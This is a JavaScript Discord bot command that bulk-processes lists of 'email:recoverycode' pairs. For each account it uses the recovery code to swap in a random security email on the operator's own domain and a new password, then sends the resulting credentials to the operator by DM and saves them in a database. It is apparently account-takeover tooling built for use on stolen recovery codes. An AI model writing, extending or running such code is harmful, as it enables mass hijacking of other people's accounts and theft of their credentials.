const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const recoverycodesecure = require('../../utils/secure/recoveryCodeSecure');
const generate = require('../../utils/generate');
const { queryParams } = require('../../../db/database');
const { domains } = require('../../../config');

const MAX_BULK = 7;

module.exports = {
    name: "bulkrecsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            // Settings lookup uses interaction.user.id (the Discord user), not client.username (the bot account)
            let settings = await queryParams(
                `SELECT * FROM secureconfig WHERE user_id=?`,
                [interaction.user.id]
            );

            if (settings.length === 0) {
                return interaction.editReply({ content: `Couldn't get your settings! Run /secure config first.` });
            }
            settings = settings[0];

            const accountsRaw = interaction.fields.getTextInputValue('accounts');
            const targetEmailsRaw = interaction.fields.getTextInputValue('target_emails') || '';

            const accountLines = accountsRaw.trim().split('\n').map(l => l.trim()).filter(Boolean);
            const targetEmailLines = targetEmailsRaw.trim() ? targetEmailsRaw.trim().split('\n').map(l => l.trim()).filter(Boolean) : [];

            if (accountLines.length === 0) {
                return interaction.editReply('Please provide at least one account to secure.');
            }
            if (accountLines.length > MAX_BULK) {
                return interaction.editReply(`Too many accounts! Please provide at most **${MAX_BULK}** accounts at a time.`);
            }

            await interaction.editReply({
                embeds: [{
                    title: `⏳ Bulk Securing ${accountLines.length} account(s)...`,
                    description: `Results will be sent to you via DM as each one completes.\nPlease keep your DMs open.`,
                    color: 0xb2c7e0
                }]
            });

            // Process all accounts concurrently
            const securePromises = accountLines.map(async (line, i) => {
                const parts = line.split(':');
                if (parts.length < 2) {
                    return interaction.user.send({
                        embeds: [{
                            title: `❌ Invalid Format`,
                            description: `**Line ${i + 1}:** \`${line}\`\nExpected format: \`email:recoverycode\``,
                            color: 0xff4444
                        }]
                    }).catch(() => {});
                }

                const [email, recoveryCode] = parts;

                // Determine target email/password
                let secEmail, password;
                if (i < targetEmailLines.length && targetEmailLines[i]) {
                    const targetParts = targetEmailLines[i].split(':');
                    if (targetParts.length >= 2) {
                        secEmail = targetParts[0].trim();
                        password = targetParts[1].trim();
                    } else {
                        secEmail = targetEmailLines[i].trim();
                        password = generate(16);
                    }
                } else {
                    secEmail = `${generate(16)}@${settings.domain || domains[0]}`;
                    password = generate(16);
                }

                try {
                    console.log(`[BULK] Securing ${email} → ${secEmail}`);
                    const result = await recoverycodesecure(email, recoveryCode, secEmail, password);

                    let dmContent;

                    if (result === null) {
                        dmContent = {
                            embeds: [{ title: `❌ Account Not Found`, description: `Email: \`${email}\`\nReason: Account does not exist or is invalid.`, color: 0xff4444 }]
                        };
                    } else if (result === 'invalid') {
                        dmContent = {
                            embeds: [{ title: `❌ Invalid Recovery Code`, description: `Email: \`${email}\`\nThe recovery code provided was incorrect.`, color: 0xff4444 }]
                        };
                    } else if (result === 'tfa') {
                        dmContent = {
                            embeds: [{ title: `⚠️ 2FA Blocked`, description: `Email: \`${email}\`\n2FA is enabled on this account. Use a different secure method.`, color: 0xffaa00 }]
                        };
                    } else if (result === 'same') {
                        dmContent = {
                            embeds: [{ title: `⚠️ Same Details`, description: `Email: \`${email}\`\nThe new security email/password is the same as the old one.`, color: 0xffaa00 }]
                        };
                    } else if (result === 'unknown') {
                        dmContent = {
                            embeds: [{ title: `❌ Unknown Error`, description: `Email: \`${email}\`\nAn unknown error occurred during securing.`, color: 0xff4444 }]
                        };
                    } else {
                        // Success
                        let recsecId = generate(32);
                        await queryParams(
                            `INSERT INTO actions(id, action) VALUES(?, ?)`,
                            [recsecId, `copyrec|${result.email2}|${result.secEmail}|${result.password}|${result.recoveryCode}`]
                        );

                        dmContent = {
                            embeds: [{
                                title: `✅ Account Secured Successfully!`,
                                fields: [
                                    { name: 'Email', value: `\`\`\`\n${result.email2}\n\`\`\``, inline: true },
                                    { name: 'Security Email', value: `\`\`\`\n${result.secEmail}\n\`\`\``, inline: true },
                                    { name: 'Password', value: `\`\`\`\n${result.password}\n\`\`\``, inline: false },
                                    { name: 'Recovery Code', value: `\`\`\`\n${result.recoveryCode}\n\`\`\``, inline: false }
                                ],
                                color: 0x57f287
                            }],
                            components: [
                                new ActionRowBuilder().addComponents(
                                    new ButtonBuilder()
                                        .setCustomId(`copyrec|${recsecId}`)
                                        .setLabel('📋 Copy Text')
                                        .setStyle(ButtonStyle.Secondary)
                                )
                            ]
                        };
                    }

                    await interaction.user.send(dmContent).catch(() => {});
                } catch (err) {
                    console.error(`[BULK] Error processing ${email}:`, err);
                    await interaction.user.send({
                        embeds: [{
                            title: `❌ Error`,
                            description: `Email: \`${email}\`\nAn unexpected error occurred while securing this account.`,
                            color: 0xff4444
                        }]
                    }).catch(() => {});
                }
            });

            await Promise.all(securePromises);

            await interaction.editReply({
                embeds: [{
                    title: `✅ Bulk Secure Complete`,
                    description: `Processed **${accountLines.length}** account(s). Check your DMs for individual results.`,
                    color: 0x57f287
                }]
            });

        } catch (error) {
            console.error('[BULK] Fatal error in bulkrecsecure:', error);
            try {
                if (interaction.deferred || interaction.replied) {
                    await interaction.editReply('An unexpected error occurred while processing. Please try again.');
                } else {
                    await interaction.reply({ content: 'An unexpected error occurred.', ephemeral: true });
                }
            } catch (_) {}
        }
    }
};
